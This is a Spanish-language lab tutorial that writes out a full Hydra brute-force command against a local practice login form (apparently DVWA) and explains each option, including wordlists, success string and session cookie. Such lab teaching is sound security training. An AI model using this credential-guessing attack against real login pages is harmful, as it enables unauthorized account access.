En este apartado, vamos a realizar un ataque de fuerza bruta para conseguir acceso a nuestra página web vulnerable, haciendo uso de hidra junto a un par de wordlists con posibles nombres de usuarios y contraseñas filtradas. Para ello vamos a implementar el siguiente comando:


    hydra -L /home/ubuntu/Desktop/credentials/users.txt admin -P /home/ubuntu/Desktop/credentials/passwds.txt 'http-get-form://127.0.0.1/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie\: PHPSESSID=j422143437vlsdgqs0t1385420; security=medium'


hydra
    
    → Es la herramienta utilizada para realizar el ataque de fuerza bruta.

-L /home/ubuntu/Desktop/credentials/users.txt
    
    → Especifica la lista de usuarios. Si quisieras probar varios usuarios, usarías -L con un archivo de nombres de usuario.

-P /home/ubuntu/Desktop/credentials/passwds.txt
    
    → Especifica la lista de contraseñas, la cual contiene millones de combinaciones comunes.

http-get-form://127.0.0.1/vulnerabilities/brute/

    → Indica que se atacará un formulario de inicio de sesión usando el método GET.
    → La URL objetivo es http://127.0.0.1/vulnerabilities/brute/ 

username=^USER^&password=^PASS^&Login=Login
    
    → Define la estructura del formulario de autenticación:

        ^USER^ será reemplazado por el usuario (admin en este caso).
        ^PASS^ será reemplazado por cada contraseña de la lista.
        Login=Login representa el botón de envío.

:S=Welcome
    → Indica la condición de éxito: si la respuesta del servidor contiene la palabra "Welcome", significa que el acceso fue exitoso.

:H=Cookie\: PHPSESSID=j422143437vlsdgqs0t1385420; security=medium
    → Agrega una cabecera HTTP con cookies:

        PHPSESSID=j422143437vlsdgqs0t1385420 
            Identificador de sesión que puede ser necesario si el sistema lo requiere.
    
        security=medium 
            Establece un nivel de seguridad en la plataforma de pruebas (posiblemente DVWA, Damn Vulnerable Web Application).
